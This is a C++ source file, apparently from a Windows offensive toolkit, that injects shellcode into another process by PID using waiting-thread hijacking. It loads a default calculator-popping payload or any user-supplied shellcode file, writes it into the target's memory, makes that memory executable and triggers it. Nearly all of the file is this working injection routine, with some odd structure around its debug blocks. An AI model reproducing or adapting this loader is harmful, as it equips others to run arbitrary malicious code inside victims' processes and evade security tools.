#ifndef UNICODE
#define UNICODE
#endif 

#define DEBUG

/*
Example how to use below:
-----------------------------
#ifdef DEBUG
	std::cout << "Debugging information: Program is running smoothly." << std::endl;
	#endif
-----------------------------
*/

#include "awaiting_thread.cc"
#include "shcode.h"

int validate_components();

//decide which technique to use in rmt_thd_selector (remote thread injection)
int await_thd_selector(int argc, char* argv[]);

//methods to deliver payload
BYTE* thread_hijacking();
BYTE* alternative_technique();

int main(int argc, char* argv[]);

int await_thd_selector(int argc, char* argv[]) {
#ifdef DEBUG
    std::cout << "Debug mode is ON" << std::endl;
#endif

    if (argc < 2) {
#ifdef DEBUG
        std::cout << "Waiting Thread Hijacking. Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
            << "Arg <PID> [shellcode_file*] [new_thread*]\n"
            << "* - optional; requires shellcode with clean exit\n"
            << "* - optional: if not 0, the passed shellcode will be run in a new thread"
#endif
            << std::endl;
        return 0;
    }
#ifdef DEBUG
    int new_thread = 0;
    BYTE* payload = g_shellcode_pop_calc;
    size_t payload_size = sizeof(g_shellcode_pop_calc);
    if (argc > 2) {
        char* filename = argv[2];
        payload = load_from_file(filename, payload_size);
        if (!payload) {
#ifdef DEBUG
            std::cerr << "Failed loading shellcode from file: " << filename << std::endl;
#endif
            return (-1);
        }
#ifdef DEBUG
        std::cout << "Using payload from file: " << filename << std::endl;
#endif
    }
    if (argc > 3) {
        new_thread = loadInt(argv[3], false);
    }
    DWORD processID = loadInt(argv[1], false);
    if (!processID) {
#ifdef DEBUG
        std::cerr << "No process ID supplied!\n";
#endif
        return -1;
    }
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
    if (!hProcess) {
#ifdef DEBUG
        std::cerr << "Failed opening the process!\n";
#endif
        return 0;
    }
    CloseHandle(hProcess);
    size_t shellc_size = 0;
    BYTE* shellc_buf = nullptr;

    if (new_thread) {
#ifdef DEBUG
        std::cout << "The passed shellcode will run in a new thread\n";
#endif
        LPVOID shellc2 = alloc_memory_in_process(processID, payload_size);
        if (!write_buf_into_process(processID, shellc2, payload, payload_size)) {
#ifdef DEBUG
            std::cerr << "Failed writing Shc2!\n";
#endif
            return (-2);
        }
        if (!protect_memory(processID, (LPVOID)shellc2, payload_size, PAGE_EXECUTE_READWRITE)) {
#ifdef DEBUG
            std::cerr << "Failed making Shc2 memory executable!\n";
#endif
            return (-2);
        }
#ifdef DEBUG
        std::cout << "Written Shellcode 2 at: " << std::hex << (ULONG_PTR)shellc2 << std::endl;
#endif
        shellc_buf = wrap_shellcode2(shellc_size, shellc2);
    }
    else {
        shellc_buf = wrap_shellcode1(payload, payload_size, shellc_size);
    }

    int status = 0;
    if (execute_injection(processID, shellc_buf, shellc_size)) {
#ifdef DEBUG
        std::cout << "Done!\n";
#endif
    }
    else {
#ifdef DEBUG
        std::cout << "Failed!\n";
#endif
        status = (-1);
    }
    return status;
}

